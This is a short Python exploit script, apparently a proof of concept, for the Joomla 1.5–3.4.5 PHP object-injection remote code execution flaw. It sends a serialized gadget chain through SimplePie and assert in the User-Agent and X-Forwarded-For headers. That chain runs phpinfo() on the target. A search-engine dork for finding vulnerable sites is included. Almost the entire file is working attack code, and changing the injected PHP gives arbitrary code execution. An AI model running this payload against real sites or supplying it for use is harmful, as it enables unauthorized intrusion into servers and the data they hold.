#!/usr/bin/env python
# author:Xiaogang
# Help: joomla 1.5-3.4.5 反序列化命令执行漏洞
# inurl:component/users/?view=login

import requests
import sys


def test_hint():
    print('[INFO] Checking Joomla 1.5 - 3.4.5 ...')

def test(url):
    target = url.strip()
    headers = make_headers()
    for i in headers:
        try:
            test_hint()
            result = get_url(target,i)
            if "PHP Version" in result.text:
                print("{}成功执行phpinfo".format(i.keys()))
            else:
                print("{}漏洞不存在".format(i.keys()))
        except Exception as e:
            print("出现错误",e)


def get_url(url,headers):
    cookies = requests.request("GET", url, timeout=10,headers=headers).cookies
    response = requests.request("GET",url,timeout=10,headers=headers,cookies=cookies)
    return response

def make_headers():
    terminate = '\xf0\x9d\x8c\x86'
    payload = r'''123}__test|O:21:"JDatabaseDriverMysqli":3:{s:4:"\0\0\0a";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:6:"assert";s:10:"javascript";i:9999;s:8:"feed_url";s:37:"phpinfo();JFactory::getConfig();exit;";}i:1;s:4:"init";}}s:13:"\0\0\0connection";i:1;}'''
    headers1 = {
        'User-Agent': payload+terminate
        }
    headers2 = {
        'X-Forwarded-For': payload+terminate,
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:49.0) Gecko/20100101 Firefox/49.0'
    }
    header = [headers1,headers2]
    return header


def main():
    args = sys.argv
    if len(args) == 2:
        url = args[1]
        test(url)
    else:
        print("Usage: python {} url地址 ".format(args[0]))


if __name__ == '__main__':
    main()


